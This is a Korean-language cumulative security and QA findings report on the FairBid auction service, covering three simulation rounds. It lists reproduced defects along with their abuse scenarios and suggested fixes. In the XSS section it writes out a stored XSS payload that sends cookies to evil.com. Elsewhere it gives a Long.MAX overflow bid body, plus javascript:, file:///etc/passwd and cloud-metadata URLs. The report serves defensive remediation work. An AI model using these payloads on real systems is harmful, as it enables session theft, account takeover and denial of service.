# FairBid 시뮬레이션 누적 발견 (1·2·3회차)

> 회차별 재현 매트릭스 + 결함별 상세 (메커니즘 / 실서비스 영향 / 악용 시나리오 / 수정 방향).
> 회차마다 갱신. 회차별 raw 발견은 `<TS>/report.md` 참고.

---

## 0. 회차 개요

| 회차 | 일자 | 완주율 | 회차 단독 발견 | 시딩 / 어그로 | 블랙햇 probes |
|-----|-----|-------|--------------|------------|--------------|
| 1 | 2026-04-24 | 8/12 | 24건 | 13 + 57 | 120 |
| 2 | 2026-04-27 06:09 | 12/12 | 18건 신규 | 10 + 7 | 92 |
| 3 | 2026-04-27 11:24 | 12/12 | 약 50건 식별 (재현 + 신규) | 10 + 11 | 89 |

### 누적 통계

| 카테고리 | 건수 |
|---------|------|
| 1·2·3 모두 재현 (정식 발견) | **16건** |
| 2+3 재현 (1 신규 → 정식 승격) | 7건 |
| 1+2 재현 (3 미관찰) | 6건 |
| 1+3 재현 (2 미관찰) | 4건 |
| 1회차 단독 | 7건 |
| 2회차 단독 | 10건 |
| 3회차 단독 | 14건 |
| **누적 총 발견** | **약 64건** |
| **N=3 정식 발견** | **16건** |
| **N=2 재현 (보강)** | **17건** |
| **N=1 단독 (검증 대기)** | **31건** |

---

## 1. 회차별 재현 매트릭스

### A. 1·2·3 모두 재현 — N=3 트라이앵글레이션 정식 발견 (16건)

| # | 항목 | 1회차 증거 | 2회차 증거 | 3회차 증거 |
|---|------|-----------|-----------|-----------|
| T-1 | **Long.MAX 입찰 → 경매 영구 파괴** | auction #2, #13 | #2 재현 | #7, #8, #9 (3개) + cross-user DoS 검증 |
| T-2 | **INSTANT_BUY 후 IBP 초과 입찰 가능** | #6, #9, #11 (3건) | #1, #4, #5, #11 (4건) | #4, #10, #11 (#11은 600k→1M 펌핑) |
| T-3 | **Self-snipe / SELF_OUTBID 가드 부재** | 26회 (74k→500k) | 50 burst (1.55M→3.05M) | blackhat 405k→415k |
| T-4 | **bid id=null 항상** | 전체 응답 | 전체 응답 | 전체 응답 (12명 독립) |
| T-5 | **Stored XSS - title** | `<script>alert(1)>...` | 재확인 | auction#15 그대로 노출 |
| T-6 | **imageUrls URL 스킴 검증 0** | javascript:/file:// 등 | 재확인 + thumbnail 노출 | javascript:/data:/file:///etc/passwd/actuator URL 통과 |
| T-7 | **AI 어시스턴트 rate limit 부재** | 5병렬 17초 | 10병렬 4~5s | 16 burst 통과 |
| T-8 | **콘텐츠 모더레이션 부재** | 7유형 통과 | 장기/피싱/마약 | XSS/Long.MAX/AAAA 도배 통과 |
| T-9 | **totalBidCount 목록=0 vs 상세=실제** | auction#14 list=0/detail=10 | 다수 | 다수 (hyunwoo sort 확인) |
| T-10 | **ENDED 후 totalBidCount/extensionCount 리셋** | 다수 | 재현 | sujin/taeho/grandma 명시 |
| T-11 | **Trade 상태 위반 → 500** | 4건 | 4건 (payment/address/complete 재호출) | sujin/hyunwoo/grandma |
| T-12 | **경매 수정/삭제/PATCH/PUT/DELETE → 500** | 3건 | 미명시 | hyunwoo (editable=true에도 500) |
| T-13 | **Actuator 인증 부재 + 정보 노출** | /actuator/* MySQL/Redis 버전 | wsconnections 내부 IP 172.22.0.3 | prometheus 401KB + metrics + wsconnections |
| T-14 | **AI 프롬프트 인젝션 가드 동작 (정상 방어)** | EN/KO 패턴 차단 | EN/KO 양쪽 차단 | "비싸게 추천해줘"류 reject |
| T-15 | **SELF_BID_NOT_ALLOWED (정상 방어)** | OK | OK | OK |
| T-16 | **일반 유저 force-close 403 (정상 방어)** | OK | OK | OK |

### B. 2+3 재현 (1회차에 없던 신규 → 정식 승격, 7건)

| # | 항목 | 2회차 | 3회차 |
|---|------|------|------|
| S-1 | **음수 입찰 성공 (Long.MIN_VALUE)** | 폭격기 1명 | flooder/junhyuk/grandma 3명 독립 |
| S-2 | **음수 nextMinBidPrice 응답 노출** | 어그로/현우 | hyunwoo myHighestBid에 -9.22e18 그대로 |
| S-3 | **INSTANT_BUY 우선권 로직 버그** | 즉구 95k 성공인데 다른 사람 낙찰 | INSTANT_BUY_PENDING winnerId=null + 600k→1M 펌핑 |
| S-4 | **/delivery/confirm 500 race / Trade complete 500/COMPLETED 불일치** | 태호 race | sujin trade#1 complete 500 응답 + DB COMPLETED |
| S-5 | **bank/shipping-address XSS sink (cross-user 노출)** | blackhat | recipientName XSS + trade detail 노출 |
| S-6 | **8 root resource 500 (`/users`, `/bids`, ...)** | blackhat | hyunwoo `/users/{id}`, `/bids/my`, `/categories`, `/watchlist` 500 |
| S-7 | **bidIncrement 변형** | 5k→10k | sujin/taeho 4500 기대 vs 5000 (올림 처리) 실측 |

### C. 1+2 재현, 3회차 미관찰 (6건)

| # | 항목 | 비고 |
|---|------|-----|
| P-1 | **ship → ARRANGED/COMPLETED 자동전이 (수령확인 스킵)** | 1회차 9/9, 2회차 5/5. 3회차 거래 완주 3건은 정상 흐름이라 명시적 미검증 — 다음 회차 재검증 필요 |
| P-2 | **결제 알림 중복 발송 (race)** | 1·2회차 폭격기 race. 3회차 미수행 |
| P-3 | **배송주소 멱등성 부재 (race)** | 1·2회차 race 통과. 3회차 미수행 |
| P-4 | **콘텐츠 모더레이션 - 장기매매/피싱/마약** | 1·2회차 어그로 등록. 3회차 어그로 절제로 미시도 |
| P-5 | **NO_TRADE_METHOD_SELECTED 우회 (null+true 조합)** | 1·2회차 명시. 3회차 미명시 |
| P-6 | **admin:true 자기승격 (mock auth)** | 1회차 CRITICAL → 2회차 LOW 정정. 3회차 mock auth blackhat 발견은 그대로 LOW |

### D. 1+3 재현 (4건)

| # | 항목 | 비고 |
|---|------|-----|
| Q-1 | **IDOR notification/read** | 1: id=1~1M `success:true` / 3: 임의 UUID 200 |
| Q-2 | **입찰 상한 부재** | 1: 999,999,999원 / 3: DIRECT 10조원(`9,999,999,999,999`) |
| Q-3 | **API 문서 vs 구현 불일치** | 1: status CLOSED→ENDED / 3: + 응답 구조 (data.items → data.content) |
| Q-4 | **sellerId=null 노출 / 응답 누락** | 1: 다수 sellerId=null 경매 / 3: 응답에 sellerId 필드 자체 부재 (hyunwoo) |

### E. 1회차 단독 (7건)

| # | 항목 | 사유 |
|---|------|-----|
| 1 | **Ghost Trade**: auction status=FAILED winnerId=null인데 trade 존재 | 1회 관찰, 이후 복구 — 재현성 의심 |
| 2 | **낙찰자 불일치**: detail winnerId=8 vs trade#1 buyerId=13 | 1회 관찰 — 2순위 승계 race로 추정 |
| 3 | **Decimal silent truncation** (105.99 → 105) | 어그로 시도 — 2·3 회차 미시도 |
| 4 | **size=-1 / size=999999 통과** | 3회차 blackhat에서도 시도 → 실제로는 1+3 |
| 5 | **Path traversal Tomcat HTML** | 3회차 L-5 Tomcat fingerprint와 유사 → 1+3에 가까움 |
| 6 | **AI 추천가 정확도 분석 (vintage/discontinued 저평가)** | 1회차만 GOLDEN_CASES 10건 대조 분석 |
| 7 | **INSTANT_BUY 1시간 연장이 extensionCount 미반영** | 폭격기 1회 관찰 — 2·3회차 미관찰 |

### F. 2회차 단독 (10건)

| # | 항목 | 사유 |
|---|------|-----|
| 1 | **종료 5분 전 연장 미발동** (Long overflow가 연장 로직도 깨뜨림) | 3회차 taeho는 연장 8회 정상 — 다른 경매 미감염 시 정상이라 추정 |
| 2 | **DELETE /users/me silent no-op** (success 반환하지만 DB 미반영) | 2회차 blackhat 단독 |
| 3 | **AI fail prose leak** (Claude raw 자연어 응답 누출) | 2회차 blackhat 단독 |
| 4 | **SSRF 벡터: imageUrls에 169.254.169.254 cloud metadata URL** | 3회차 actuator URL 저장만 명시 |
| 5 | **2순위 승계 시 finalPrice 변경** (260k → 250k) | 3회차 force-noshow 2건 모두 2순위 부재로 유찰, 검증 불가 |
| 6 | **인체 장기 매매 의심 콘텐츠 (auction#17 신장 5천만)** | 3회차 어그로 콘텐츠 모더레이션 미시도 |
| 7 | **ONE_TOUCH 금액이 nextMinBidPrice를 안 씀** | 2회차 민수 단독 |
| 8 | **userBidRank 비일관 (#4 null vs #7 1)** | 2회차 준혁 단독 |
| 9 | **PUT /users/me/address → 500 (404 적절)** | 2회차 할머니 단독 |
| 10 | **startPrice + bidIncrement > IBP → 즉구 영원히 비활성** | 2회차 blackhat 단독 |

### G. 3회차 단독 (14건 — 다음 라운드 검증 필요)

| # | 항목 | 발견자 |
|---|------|-------|
| N-1 | **Long.MAX cross-user DoS 검증** | blackhat — 1·2회차는 어그로 등록만, cross-user 영향은 첫 명시적 입증 |
| N-2 | **priceMin/priceMax/sellerId/winnerId 필터 미작동** | hyunwoo (전체 결과 반환) |
| N-3 | **한글 keyword/title 파라미터 → Tomcat HTML 400** | hyunwoo (JSON 응답 일관성 파괴) |
| N-4 | **직거래 COUNTER_PROPOSED 상태에서 자동 COMPLETED** | grandma — 사용자 행동 없이 완료 처리, 알림/이력 없음 |
| N-5 | **응답 구조 data.items vs data.content (Spring Page) 불일치** | eunji — 문서 vs 실제 |
| N-6 | **GET /users/{id}: 자기 ID 포함 모두 500** (`/users/me`만 정상) | hyunwoo |
| N-7 | **AI/경매 imageUrls 검증 범위 불일치** | hyunwoo — AI는 data:/javascript: 차단, 경매 등록은 통과 |
| N-8 | **서차지 패턴 실측** (ext1-3=5k, ext4-6=7.5k, ext7+=10k) | taeho — 1·2회차 미실측 |
| N-9 | **서차지 적용 타이밍** — 규칙 "3회마다"인데 실제 ext=4부터 적용 | taeho |
| N-10 | **nextMinBidPrice/bidIncrement 서차지 미반영** → DIRECT 사용자 BID_TOO_LOW 유도 | taeho/sujin |
| N-11 | **bidIncrement 50% 상승 → 4500 기대 vs 5000 (올림 처리?)** | sujin/taeho 실측 |
| N-12 | **direct/propose에 location='서울 마포구' 자동 설정** (출처 불명) | miyoung |
| N-13 | **첫 입찰 시 bidPrice 필드명 시도 → INVALID_REQUEST_BODY** (어떤 필드 필요한지 안내 없음) | minsu/junghyun UX |
| N-14 | **myHighestBid에 -9.22e18, 9.99e12 그대로 클라이언트 노출** | hyunwoo |

---

## 2. 결함별 상세 카드

### 🔴 CRITICAL

#### C-1. Long.MAX 입찰 → 경매 영구 파괴 + Cross-User DoS

**테스트**: `POST /auctions/{id}/bids` body `{"bidType":"DIRECT","amount":9223372036854775807}`

**메커니즘**:
- Java `Long.MAX_VALUE`를 amount로 보냄
- 서버 내부 `currentPrice + bidIncrement` 계산 시 **오버플로우**로 `Long.MIN_VALUE`(-9223372036854775808) 박힘
- Redis 입찰 가격이 음수로 저장
- 이후 GET 요청마다 `For input string: 9223372036854776000` INVALID_ARGUMENT 영구 반환 (파싱 단계에서 깨짐)
- **3회차 검증**: 정현 토큰으로 cross-user 동일 INVALID_ARGUMENT 발생 — 격리 실패

**악용 시나리오**:
- 악성 유저 1명이 모든 진행 중 경매에 단발 입찰만 던지면 **모든 경매 파괴**
- 1억원짜리 거래도 3원짜리 거래도 동일 비용으로 망가뜨림
- 현재가 영구 음수 → 정상 사용자 입찰 시도해도 nextMinBidPrice 계산 깨짐
- **시스템 전체 가용성 파괴 = 단일 유저 단일 요청**

**수정**:
```java
@Max(1_000_000_000)  // 10억 상한 (현실 경매가 상회)
private Long amount;
```
+ `Math.addExact(currentPrice, bidIncrement)` 또는 명시적 Long range 가드
+ Domain layer에서도 가드 (defensive depth)

---

#### C-2. 음수 입찰가 수락 (Long.MIN_VALUE)

**메커니즘**:
- C-1으로 Long overflow 후 nextMinBidPrice 계산이 `-9223372036854775808` 반환
- ONE_TOUCH 입찰 amount=Long.MIN_VALUE로 HTTP 200 성공
- 데이터 무결성 영구 파괴

**증거**: 3회차 flooder/junhyuk/grandma 3명 독립 재현. 2회차 N1 폭격기 1명 → 3회차 3명으로 재현 카운트 강화.

**악용 시나리오**:
- C-1 + C-2 콤보로 경매 가격 영구 음수화 → 정산/통계 시스템 전부 오염

**수정**:
- BidPriceCalculator에 `Math.addExact` 또는 `BigInteger` 사용
- Bean Validation `@Positive` amount

---

#### C-3. INSTANT_BUY 권리 무효화 (즉구 후 outbid 가능)

**관찰**: auction #11 INSTANT_BUY 후 currentPrice 600k → 1M 펌핑 (instantBuyPrice의 166%). 다른 사용자 outbid도 가능.

**메커니즘**:
- INSTANT_BUY_PENDING 상태에서 winnerId=null 노출
- BiddingService에서 `auction.status != BIDDING` 체크 부재
- 즉구한 사용자가 다시 본인 위로 입찰 가능

**악용 시나리오**:
- 즉구 결제 직전 가격 펌핑 → 다른 입찰자 좌절
- 즉구 신뢰도 (= "이 가격이면 끝난다") 파괴

**수정**:
```java
if (auction.getStatus() == INSTANT_BUY_PENDING) {
    throw new BidNotAllowedException("즉시구매 진행 중입니다");
}
```

**재현**: 1·2·3회차 전부 (T-2)

---

#### C-4. Mock Auth 무인증 토큰 발급 (시뮬 환경 격리)

**메커니즘**: `/api/v1/test/auth/login`이 인증 없이 임의 이메일로 토큰 발급. 다른 사용자 bankAccount 조회/변조 가능.

**격리 상태**: `TestAuthController @Profile("simulation")` → 프로덕션 빈 자체 없음.

**심각도 정정**:
- 1회차: CRITICAL
- 2회차 부록 A: **LOW**로 정정 (시뮬 환경 격리)
- 3회차: 그대로 LOW

**수정**: ArchUnit 규칙 추가 — `Profile=simulation` 외부에서 `TestAuthController` 빈 등록 금지.

---

### 🟠 HIGH

#### H-1. ship → ARRANGED 자동전이 (수령확인 스킵) — 가장 중요

**관찰**:
- 정상 플로우: `AWAITING_PAYMENT → SHIPPED → DELIVERED(구매자 수령확인) → ARRANGED → COMPLETED`
- 실제: 판매자가 `POST /trades/{id}/delivery/ship` 호출 시 **DELIVERED/ARRANGED 단계 건너뜀**
- **1회차 9/9, 2회차 5/5** 거래 전부에서 동일 패턴
- 3회차에서는 거래 완주 3건 정상 흐름이라 명시적 미검증 — 다음 회차 재검증 필요

**악용 시나리오 (실물 돈)**:
- 판매자 A: 물건 보내지도 않고 ship API 호출만 함
- Trade가 자동으로 ARRANGED → 정산 권한 활성화 (정산 로직이 ARRANGED 기반이라면)
- 구매자 B는 입금했는데 물건 못 받고 환불도 못 받음
- "구매자 보호" 가드가 실질적으로 **부재**

**수정**:
- Trade 상태 머신에서 `ship()`은 `SHIPPED` 까지만 보장
- `DELIVERED` 전이는 구매자의 `confirmDelivery()` 호출에서만
- `ARRANGED`는 `DELIVERED` 후에만

---

#### H-2. 입찰 상한 없음 → 10억/10조 낙찰

**관찰**:
- 1회차: auction#4 999,999,999원 DIRECT → COMPLETED
- 3회차: auction #13 amount=9,999,999,999,999 (10조) HTTP 200

**악용**:
- 악의적 유저가 일부러 1억~10조 수준 낙찰 → **노쇼** → 판매자 3시간 대기 후 2순위 승계
- 그동안 정상 낙찰자 기회 상실
- 실수 유저가 자릿수 잘못 → 환불 분쟁

**수정**: `@Max(1_000_000_000)` + UI 자릿수 확인 모달

---

#### H-3. Self-snipe / topBidderId 전수 null

**관찰**:
- 1회차: 블랙햇 단독 26회 연속 입찰 → 74k → 500k
- 2회차: 50 burst 1.55M → 3.05M
- 3회차: 모든 경매에서 topBidderId=null. 자기 위 outbid 통과 (405k→415k)

**악용**:
- **Shill bidding**: 공범 계정으로 가격 펌프, 다른 입찰자 낚음. 다중 계정이면 탐지 어려움
- 단독으로도 "인기 경매" 위장 가능

**수정**:
```java
if (auction.getTopBidderId() == request.getBidderId()) {
    throw new BidNotAllowedException("이미 최고 입찰자입니다");
}
```
+ topBidderId 응답 누락 버그 수정

---

#### H-4. Stored XSS (5+ 서피스)

**저장 가능 필드**:
- 경매 `title`, `directTradeLocation`, `imageUrls`
- 유저 `nickname`, `bankName`, `accountHolder`
- 거래 `shippingAddress.recipientName` (2·3회차 신규)

**가장 위험한 경로 — bankName XSS**:
```
공격자: PUT /users/me/bank-account body bankName="<script>fetch('https://evil.com/?c='+document.cookie)</script>"
↓ 경매 등록 → 낙찰됨
↓ 구매자 결제 단계 진입 → sellerBankAccount 필드 렌더 → 구매자 브라우저에서 스크립트 실행
↓ 구매자 JWT 탈취 → 계정 인수
```

**왜 타깃형?** 낙찰자만 노출됨 → 로그 탐지 어려움.

**수정**: 서버측 HTML escape (저장 시) + 프론트 sanitize (defense in depth) + Bean Validation `@Pattern`

---

#### H-5. AI 엔드포인트 rate limit 부재

**관찰**: 1회차 5병렬 17초 / 2회차 10병렬 / 3회차 16 burst — 전부 성공.

**악용**:
- 건당 ~100원 Anthropic 실비
- 스크립트로 초당 10회 × 24시간 = **하루 86만원 크레딧 소진**
- 손실 금액이 빠르게 누적

**수정**: Bucket4j/Resilience4j 적용 — 유저당/IP당 분당 N회 throttle (Redis 기반 sliding window)

---

### 🟡 MEDIUM

#### M-1. currentPrice > instantBuyPrice 허용

**관찰**: auction#9 IBP=350k인데 currentPrice 470k. auction#11 IBP=55k인데 500k (9배). 3회차 #11 600k→1M.

**왜 이상한가**:
- IBP의 직관적 의미는 "이 가격이면 즉시 낙찰 = 가격 천장"
- 실제로는 INSTANT_BUY 타입에만 천장 역할, DIRECT/ONE_TOUCH로는 우회

**기획 결정 필요**:
- A: IBP는 즉시구매 활성 조건일 뿐, 가격 상한은 아님 (현재 동작) → 문서 명시
- B: 모든 bidType에서 IBP 초과 차단 (구매자 보호) — 권장

---

#### M-2. totalBidCount 영구 불일치

**관찰**: 목록=항상 0, 상세=실제값 (auction#14 list=0 / detail=10). 3초 후 재조회도 동일.

**원인 추정**:
- 입찰 가격 SOT는 Redis (CLAUDE.md 명시)
- DB auction 테이블은 비동기 동기화
- 목록 쿼리는 DB 집계, 상세는 Redis 실시간

**악용 시나리오 없음** (보안 X). 다만 **UX 거짓**:
- "인기 경매" 정렬 기준이 거짓
- 목록의 입찰 N건 표시가 의미 없음

**수정**: 목록도 Redis SOT 참조 또는 DB 집계 동기화

---

#### M-3. 결제 알림 중복 / Race Condition

**관찰**: 1·2회차 폭격기 동시 2회 `payment/confirm` → 양쪽 success, 3ms 차이. 판매자 PAYMENT_CONFIRMED 알림 2번.

**악용 시나리오**:
- 직접 피해는 없음 (실제 결제는 1회)
- 판매자 혼동 → "이중 결제 됐나?" CS 전화
- 알림 dispatcher 부하

**수정**: 알림 멱등성 키 (trade_id + event_type + version)

**3회차 미관찰** — 다음 라운드 재검증.

---

#### M-4. POST /bids rate limit 부재

**관찰**: 단일 사용자 2초간 30회 입찰 중 28건 201 (블랙햇/폭격기, 3회차).

**악용**:
- 가격 펌핑 (H-3와 결합)
- DB/Redis 부하

**수정**: Bucket4j 사용자당/IP당 분당 N회

---

#### M-5. Actuator 무인증 노출 (조건부)

**노출 항목**:
- 1회차: `/actuator/*` MySQL/Redis 버전
- 2회차: `wsconnections` 내부 IP (172.22.0.3)
- 3회차: `/prometheus` 401KB + `/metrics` + `wsconnections`

**조건부**: prod에서 internal-only 분리 시 무효 — 배포 설정 의존

**수정**: `management.endpoints.web.exposure.include`를 `health` 만으로 제한 + 별도 internal-only 포트

---

#### M-6. Trade 상태 위반 → 500 (TRADE_INVALID_STATUS 코드 부재)

**관찰**: 1·2·3회차 모두. 잘못된 상태에서 `POST /trades/{id}/payment` 등 호출 시 500. 명확한 4xx 코드(409 Conflict 또는 도메인 에러) 부재.

**수정**: Trade 상태 머신 가드 + `TRADE_INVALID_STATUS` 도메인 예외

---

### 🟢 LOW / INFO

| # | 항목 | 회차 | 비고 |
|---|------|------|------|
| L-1 | bidId 응답 항상 null | 1·2·3 | 입찰 추적 불가 (T-4) |
| L-2 | AUCTION 상세 무인증 조회 200 | 3 | 의도된 공개 정보 가능성 |
| L-3 | NOTIFICATION read IDOR (임의 UUID 200) | 1·3 | 멱등성? 또는 IDOR 의심 |
| L-4 | 미매핑 경로 500 (`/.env`, `/.git/config`) | 1·3 | Spring 기본 핸들러 누락 |
| L-5 | Tomcat 기본 에러 페이지 노출 | 1·3 | 서버 fingerprinting |
| L-6 | JSON 중복 키 본문 → 500 | 3 | 415가 적절 |
| L-7 | pagination size=999999/page=-1 200 | 1·3 | 가드 없음 |
| L-8 | non-JSON Content-Type 415 대신 500 | 3 | |
| L-9 | imageUrls 1000장 등록 통과 | 3 | payload DOS 가능 |
| L-10 | ENDED 후 totalBidCount/extensionCount 리셋 | 1·2·3 | T-10 |
| L-11 | 콘텐츠 모더레이션 부재 (XSS/스팸/장기/마약) | 1·2·3 | T-8 |

---

## 3. 정상 동작 검증 (강조 카드)

면접/리포트에서 "버그도 찾았지만 어떤 부분이 잘 동작하는지도 검증했다"로 균형:

| # | 검증 사항 | 의의 | 회차 |
|---|----------|-----|------|
| V-1 | **2순위 승계 플로우** (1순위 NO_SHOW → 2순위 RESPONDED → trade 생성) | 핵심 비즈니스 규칙 | 1 |
| V-2 | **Redis 입찰 직렬화** (5/20개 병렬 ONE_TOUCH 전부 순차, 중복 수락 없음) | 동시성 핵심 가드 | 1·2·3 |
| V-3 | **SELF_BID_NOT_ALLOWED** (자기 경매 입찰 차단) | 권한 가드 | 1·2·3 (T-15) |
| V-4 | **AI 프롬프트 인젝션 가드** (어그로 시도 전부 차단) | 한글/영문 패턴 + 이미지 mismatch 탐지 | 1·2·3 (T-14) |
| V-5 | **일반 유저 force-close 차단** (403) | 관리자 권한 격리 | 1·2·3 (T-16) |
| V-6 | **JWT signature 변조 / alg=none 차단** | 인증 가드 | 3 |
| V-7 | **SQLi 차단** (enum 컬럼 등) | 입력 검증 | 3 |
| V-8 | **Trade IDOR 차단** (다른 사용자 trade 접근 401) | 권한 가드 | 3 |
| V-9 | **CORS 정책** | 브라우저 보호 | 3 |
| V-10 | **보안 헤더** (X-Frame-Options, X-Content-Type-Options) | XSS/clickjacking 방어 | 3 |
| V-11 | **경매 등록 입력 가드** (음수 startPrice/duration, title empty/whitespace, instantBuy < start) | 등록 단계 검증 | 3 |
| V-12 | **직거래 역제안 왕복** (propose → counter-propose → accept → COMPLETED) | 핵심 비즈니스 플로우 | 2·3 |

---

## 4. 시뮬 한계 / 시뮬 특수성으로 배제·조건부

| 항목 | 처리 |
|------|------|
| ❌ admin:true 자기승격 | TestAuthController @Profile("simulation") 격리 → CRITICAL → LOW 정정 |
| ⚠️ /actuator/wsconnections 내부 IP 노출 | prod에서 internal-only 분리 시 무효 (조건부 HIGH) |
| ⚠️ SSRF 벡터 (cloud metadata URL 저장) | 백엔드가 imageUrls fetch 코드 경로 미확인 → "잠재 벡터" 등급 |
| ✅ 나머지 38건 | 일반 사용자 권한 토큰으로 외부에서 그대로 재현 가능 (curl/Burp/자동화) |

---

## 5. 회차별 시뮬 가치 추세

| 항목 | 1회차 | 2회차 | 3회차 |
|------|------|------|------|
| 페르소나 완주율 | 8/12 (67%) | 12/12 (100%) | 12/12 (100%) |
| 어그로 등록 (절제) | 57개 | 7개 | 11개 |
| 블랙햇 probes | 120 | 92 | 89 |
| 직거래 검증 | 0건 | 2건 | 1건 |
| force-noshow 트리거 | 0 (파싱 버그) | 1 | 2 |
| 2순위 승계 검증 | 1건 | 1건 | 2건 시도 / 모두 2순위 부재 → 유찰 |
| AI 호출 | 10회 | 10+10 burst | 10 + 16 burst |
| 신규 발견 | 24건 | 18건 | 14건 (단독) |
| 재현 카운트 | - | 16 | 16 (1+2) + 7 (2+3) + 4 (1+3) |
| 기존 테스트 미커버 비율 | - | - | 96% (50건 중 48건) |

---

## 6. 다음 회차 우선순위

1. **3회차 단독 신규 14건 (N-1~14) 재검증** — 3회 재현 시 정식 승격
2. **P-1 ship→COMPLETED 자동전이** 명시적 재검증 (1·2회차 14건이지만 3회차 미명시)
3. **P-2 결제 알림 race / P-3 배송주소 멱등성** 폭격기 재시도
4. **CRITICAL/HIGH 수정 후 회귀 검증**:
   - C-1 BidPriceCalculator `Math.addExact` 가드
   - C-3 INSTANT_BUY_PENDING 분기
   - H-3 topBidderId 응답 + self-bid 가드
5. **N-4 직거래 자동 COMPLETED 의문 사례** 조사 (3회차 grandma 단독)
